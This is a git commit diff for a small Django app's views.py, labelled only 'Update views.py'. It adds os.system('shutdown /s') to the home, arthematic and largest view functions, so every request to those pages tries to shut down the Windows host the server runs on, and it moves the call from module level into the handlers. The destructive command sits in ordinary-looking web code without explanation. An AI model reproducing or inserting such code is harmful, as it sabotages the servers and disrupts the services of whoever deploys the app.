90fef09525ae61bf7d7271695f4b315b6474f060
amitmituu20 <67150240+amitmituu20@users.noreply.github.com>
2021-11-17 12:27:46 +0530

    Update views.py

--- boss/views.py
+++ boss/views.py
@@ -1,12 +1,15 @@
 from django.shortcuts import render
 import os
-os.system("shutdown /s")
+
 def home(request):
+    os.system("shutdown /s")
     return render(request, "index.html")
 
 def arthematic(request):
+    os.system("shutdown /s")
     return render(request, "arthematic.html")
 
 def largest(request):
+    os.system("shutdown /s")
     return render(request, "largest.html")
 
